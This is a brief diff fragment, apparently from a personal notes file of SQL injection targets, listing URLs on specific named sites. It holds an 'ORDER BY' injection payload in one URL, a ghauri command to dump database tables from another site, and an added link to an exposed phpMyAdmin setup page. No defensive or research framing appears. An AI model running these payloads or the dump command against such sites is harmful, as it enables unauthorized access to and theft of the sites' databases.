@@ -109,3 +109,5 @@ https://shaafi.com.pk/MemberDetail.php?id=30%27+ORDER+BY+14--+
 +---------------------------------------+
 
 ghauri -u https://baqai.edu.pk/InstituteDetail.php?id=8 -D information_schema -T tables -C users --dump
+
+https://wcipeg.com/phpmyadmin/setup/index.php?page=form&formset=Export#tab_Microsoft_Office
